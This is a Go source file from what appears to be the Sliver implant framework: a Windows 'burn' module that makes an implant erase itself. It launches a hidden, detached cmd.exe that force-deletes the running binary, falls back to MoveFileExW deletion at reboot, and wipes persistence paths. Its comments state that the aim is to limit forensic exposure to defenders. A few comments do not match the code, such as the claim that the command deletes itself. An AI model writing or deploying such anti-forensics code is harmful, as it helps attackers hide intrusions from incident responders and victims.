//go:build windows

package burn

/*
	Sliver Implant Framework
	Copyright (C) 2026  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"unsafe"
)

// wipeSelf cannot directly delete the running binary on Windows
// (the OS holds an open handle to the executable file). Two patterns
// are common; we use the cmd.exe-poll-and-delete trick:
//
//  1. Spawn a detached cmd.exe that loops a short delay, then
//     deletes the binary, then deletes itself (a self-erasing
//     one-liner). Detach so it survives our os.Exit.
//  2. Fall back to MoveFileEx with MOVEFILE_DELAY_UNTIL_REBOOT if
//     the cmd.exe approach fails.
//
// Best-effort either way. A determined defender can image the disk
// before reboot; the implant's job is to minimize forensic exposure,
// not to be unrecoverable.
func wipeSelf(exe string) {
	// Approach 1: detached cmd.exe that waits, then nukes the binary
	// and itself.
	//   - ping 127.0.0.1 -n 3 > NUL  (waits ~2 seconds)
	//   - del /F /Q "<exe>"          (deletes the implant)
	//   - (cmd.exe naturally exits at end of /c batch)
	cmdline := fmt.Sprintf(`/c ping 127.0.0.1 -n 3 > NUL && del /F /Q "%s"`, exe)
	cmd := exec.Command("cmd.exe", cmdline)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: 0x00000008 | // DETACHED_PROCESS
			0x00000200, // CREATE_NEW_PROCESS_GROUP
		HideWindow: true,
	}
	if err := cmd.Start(); err != nil {
		// Approach 2: MoveFileEx with MOVEFILE_DELAY_UNTIL_REBOOT.
		// Kernel32!MoveFileExW with second arg NULL + flag 0x4 marks
		// the file for deletion at next reboot.
		_ = moveFileExDelayUntilReboot(exe)
		return
	}
	// Detach the child fully so our os.Exit doesn't take it down.
	_ = cmd.Process.Release()
}

func wipePersistence(paths []string) {
	for _, p := range paths {
		if p == "" {
			continue
		}
		// Registry-key persistence paths are conventionally prefixed
		// "HKEY_..." or "HKLM\..."; everything else is a filesystem
		// path. Caller is responsible for marking which is which.
		// For MVP we treat them all as filesystem paths.
		wipePath(p)
	}
}

// moveFileExDelayUntilReboot calls Win32 MoveFileExW(src, NULL,
// MOVEFILE_DELAY_UNTIL_REBOOT). Schedules the file for deletion at
// next system reboot.
func moveFileExDelayUntilReboot(src string) error {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	proc := kernel32.NewProc("MoveFileExW")
	srcPtr, err := syscall.UTF16PtrFromString(src)
	if err != nil {
		return err
	}
	const MOVEFILE_DELAY_UNTIL_REBOOT = 0x4
	r1, _, callErr := proc.Call(uintptr(unsafe.Pointer(srcPtr)), 0, MOVEFILE_DELAY_UNTIL_REBOOT)
	if r1 == 0 {
		return callErr
	}
	return nil
}

// unsafe is only used inside MoveFileExW invocation above. Keep the
// import noted so build tooling doesn't strip it.
var _ = os.Remove
